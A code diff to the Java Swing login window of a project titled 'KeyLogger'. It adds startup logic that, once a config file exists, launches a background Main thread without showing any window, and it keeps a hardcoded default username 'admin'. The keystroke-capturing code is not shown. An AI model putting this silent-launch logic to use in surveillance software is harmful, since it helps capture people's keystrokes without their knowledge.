@@ -1,12 +1,9 @@
 
 import java.awt.Dimension;
-import java.awt.FlowLayout;
-import java.awt.Point;
 import java.awt.Toolkit;
-import javax.swing.JFrame;
-import javax.swing.JLabel;
+import java.io.File;
+
 import javax.swing.JOptionPane;
-import javax.swing.SwingUtilities;
 
 /*
  * To change this license header, choose License Headers in Project Properties.
@@ -69,19 +66,11 @@ public class UI extends javax.swing.JFrame {
 
         usenameTF.setFont(new java.awt.Font("Bahnschrift", 0, 24)); // NOI18N
         usenameTF.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED, java.awt.Color.white, java.awt.Color.darkGray, java.awt.Color.white, java.awt.Color.lightGray));
-        usenameTF.addActionListener(new java.awt.event.ActionListener() {
-            public void actionPerformed(java.awt.event.ActionEvent evt) {
-                usenameTFActionPerformed(evt);
-            }
-        });
+      
 
         passwordFT.setFont(new java.awt.Font("Trebuchet MS", 0, 18)); // NOI18N
         passwordFT.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED, java.awt.Color.white, java.awt.Color.lightGray, java.awt.Color.white, java.awt.Color.lightGray));
-        passwordFT.addActionListener(new java.awt.event.ActionListener() {
-            public void actionPerformed(java.awt.event.ActionEvent evt) {
-                passwordFTActionPerformed(evt);
-            }
-        });
+    
 
         loginBtn.setBackground(new java.awt.Color(255, 255, 255));
         loginBtn.setFont(new java.awt.Font("Tahoma", 0, 16)); // NOI18N
@@ -168,9 +157,6 @@ public class UI extends javax.swing.JFrame {
         pack();
     }// </editor-fold>//GEN-END:initComponents
 
-    private void usenameTFActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_usenameTFActionPerformed
-        // TODO add your handling code here:
-    }//GEN-LAST:event_usenameTFActionPerformed
 
     private void loginBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_loginBtnActionPerformed
         // TODO add your handling code here:
@@ -190,9 +176,6 @@ public class UI extends javax.swing.JFrame {
         }
     }//GEN-LAST:event_loginBtnActionPerformed
 
-    private void passwordFTActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_passwordFTActionPerformed
-        // TODO add your handling code here:
-    }//GEN-LAST:event_passwordFTActionPerformed
 
     /**
      * @param args the command line arguments
@@ -224,15 +207,28 @@ public class UI extends javax.swing.JFrame {
         /* Create and display the form */
         java.awt.EventQueue.invokeLater(new Runnable() {
             public void run() {
-                uiObj = new UI();
-                Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
-                uiObj.setLocation(dim.width/2-300, dim.height/2-200);
-                uiObj.setTitle("KeyLogger");
-                uiObj.setVisible(true);
-               
+                try{
+                    tempFile = new File("..//config//KeyLogger.config");
+                    if(tempFile.exists()){
+                        mainThread = new Main();
+                        Thread main  = new Thread(mainThread);
+                        main.start();
+                    }else{
+                        uiObj = new UI();
+                        Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
+                        uiObj.setLocation(dim.width/2-300, dim.height/2-200);
+                        uiObj.setTitle("KeyLogger");
+                        uiObj.setVisible(true);
+                    }
+                }catch(Exception e){
+                    System.out.println(e.getMessage());
+                }
             }
         });
     }
+    
+    static private Main mainThread;
+    static File tempFile;
     static UI uiObj;
     static DetailsForm detailObj;
     private final String defaultUsername = "admin";
